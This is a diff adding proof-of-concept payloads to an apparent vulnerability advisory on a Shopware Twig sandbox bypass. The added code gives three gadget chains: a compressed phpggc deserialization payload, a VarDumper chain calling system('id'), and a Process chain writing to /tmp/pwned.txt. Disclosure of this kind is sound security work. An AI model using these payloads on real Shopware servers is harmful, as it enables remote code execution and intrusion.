@@ -149,7 +149,20 @@ $func($arg);
 
 Going back to [1], if $arrow is an array instead of a string or closure, the validation check to prevent invocation of unsafe functions is completely skipped. Multiple static class methods within Shopware’s codebase and its dependencies were found to be suitable gadgets for achieving for remote code execution:
 
+```text
+// Gadget 1: Using \Shopware\Core\Framework\Adapter\Cache\CacheValueCompressor::uncompress() to invoke unserialize()
+// Serialized payload generated using the phpggc tool: ./phpggc -b Monolog/RCE8 system 'id'
+// Compressed payload is generated using: 
+// $ php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"'
+{{ ["\x78\x9C\x65\x90\x4D\x4F\xC3\x30\x0C\x86\x77\xE6\x67\xF8\xC8\xA9\x49\x61\x30\xE7\x86\x86\xE0\x50\x34\x09\xAE\x93\xA6\x7E\x78\xC5\x53\xDA\x4C\x49\x3A\xF1\xA1\xFE\x77\x92\x06\x8D\xA2\xDD\xEC\xF7\x8D\x5F\x3F\xCE\x06\xE5\x3D\xC2\x8B\xE9\x8D\x36\xED\xF6\xB9\xEC\x1B\x4D\x76\xFB\x64\xCD\x70\xFC\x6D\x00\x05\x7E\x3B\x14\x02\x61\x71\xBD\x78\x4F\xA2\x03\x55\x46\x9D\x31\x53\x1B\x94\xAB\xCB\x88\x87\x61\xBF\x27\x7B\xCE\x58\x4E\x19\xD9\x3C\x03\x94\xC5\x5C\x05\x35\x9F\xD4\x6A\x1A\x78\xE3\x2F\x02\xC5\x28\xA2\x71\x33\x33\x0A\xEE\xD8\x47\x27\x0B\xCE\x6A\x66\xFC\x23\x11\x77\x7F\x24\x85\x69\x5F\xA9\x36\xB6\x01\x94\x71\xFB\x2D\x82\xA6\x13\x69\x50\x8F\x28\x66\xC4\x45\x14\x71\x4D\xD5\xD0\x82\x9A\x9E\x75\xFC\x41\x4D\xAC\x25\x02\x87\x62\x1C\xCF\x30\xDC\xB3\xE7\x52\x07\xCA\xA0\x57\x09\x33\xF1\x1F\xAD\xA9\xC9\x39\x93\xFE\x26\x4F\x44\xC1\x0D\x79\x2D\xF9\x9D\xA9\x0E\x54\xFB\xDD\xA9\x8C\x7E\xBA\x2F\xCC\x51\xDF\xC4\x4E\x86\x6E\x89\xE0\x3E\x9D\xA7\x2E\xEE\x1B\xC7\xAB\x1F\x89\x25\x7F\x63"] | map(['\\Shopware\\Core\\Framework\\Adapter\\Cache\\CacheValueCompressor', 'uncompress']) | length }}
 
+// Gadget 2: Using \Symfony\Component\VarDumper\Vardumper::setHandler() and \Symfony\Component\VarDumper\Vardumper::dump() to invoke system("id"):
+{{ ['system'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'setHandler']) | length }}
+{{ ['id'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'dump']) | length }}
+
+// Gadget 3: Using \Symfony\Component\Process\Process::fromShellCommandline() to invoke proc_open("id > /tmp/pwned.txt"):
+{{ {'/':'id > /tmp/pwned.txt'} | map(['\\Symfony\\Component\\Process\\Process', 'fromShellCommandline']) | map(e => e.run()) | length }}
+```
 
 ### Exploit Conditions:
 This vulnerability can be exploited if the attacker has access to:
